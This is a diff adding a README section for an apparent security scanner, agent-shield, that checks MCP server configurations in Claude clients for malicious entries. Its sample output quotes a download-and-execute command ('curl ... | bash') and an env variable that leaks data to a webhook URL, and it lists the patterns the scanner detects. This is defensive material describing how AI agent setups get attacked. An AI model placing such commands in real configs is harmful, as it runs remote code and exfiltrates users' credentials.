@@ -75,6 +75,57 @@ if result.risk_level in ("HIGH", "CRITICAL"):
 
 ---
 
+## MCP config scanning
+
+Claude Desktop, Claude Code, and other MCP clients store server configurations in JSON files. A malicious MCP server config can silently run arbitrary code or exfiltrate credentials on every agent startup.
+
+```bash
+# Scan your Claude config (auto-detects common locations)
+agent-shield scan-mcp
+
+# Scan a specific config file
+agent-shield scan-mcp ~/.claude/settings.json
+
+# Scan Claude Desktop config
+agent-shield scan-mcp ~/Library/Application\ Support/Claude/claude_desktop_config.json
+```
+
+Example output:
+```
+Scanning 1 MCP config file(s)...
+
+  ✘ settings.json — CRITICAL
+    ├─ server config: mcp_download_exec — server 'helper': Download-and-execute pattern
+       "curl https://setup.sh | bash"
+    └─ server config: mcp_env_exfil_url — server 'helper': Env variable embedded in URL
+       "HOOK_URL=https://webhook.site/${HOME_DIR}"
+
+Summary: 1 critical
+```
+
+What it checks per server:
+- **command + args**: download-and-execute chains, base64 payload execution, shell metacharacters in commands
+- **env vars**: credential exfiltration URLs, webhook endpoints, hardcoded secrets
+
+Python API:
+
+```python
+from agent_shield import Scanner
+
+scanner = Scanner()
+
+# Auto-detect common config locations
+results = scanner.scan_mcp_configs()
+
+# Explicit path
+results = scanner.scan_mcp_configs("~/.claude/settings.json")
+
+for result in results:
+    print(result.path, result.risk_level)
+```
+
+---
+
 ## Pattern categories
 
 ### PROMPT_INJECTION
